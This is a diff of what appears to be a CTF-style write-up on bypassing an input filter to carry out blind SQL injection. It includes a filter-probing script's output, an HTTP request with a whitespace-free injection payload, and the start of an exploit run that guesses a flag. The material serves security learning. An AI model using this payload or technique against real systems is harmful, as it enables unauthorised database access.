@@ -20,7 +20,8 @@ Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
 Connection: keep-alive
 ```
-But it seems that there is a filtering mechanism which block malicious charcters :
+
+But it seems that there is a filtering mechanism which block/detecte malicious charcters :
 
 ```
 HTTP/1.1 200 OK
@@ -35,14 +36,29 @@ Content-Type: text/html
 Attack Detected !
 ```
 
-So, we need to determine the pattern used by the target in order to bypass it later. For example, we can try to inject all possible ascii code :
+First, we need to determine what pattern is used by the target in order to bypass it later. For example, we can try to inject all possible ascii code and compre response :
 
- 
-
+```
+tmr@desktop:~$ python pattern_detector.py
+[+]   is filtred  //whitespace
+[+] " is filtred  //quotes
+[+] ' is filtred
+[+] / is filtred  // slache
+[+] \ is filtred  // anti-slache
+```
 
 
 ```
-tmr@os:~$ python exploit.py 
+GET /demo/index.php?id=(null)or(1)=(1) HTTP/1.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:20.0) Gecko/20100101 Iceweasel
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+```
+
+```
+tmr@desktop:~$ python exploit.py 
 [+] Blind SQL Injection Exploit Using LIKE Technic 
 [+] New Guessed Char : E
 FLAG_E
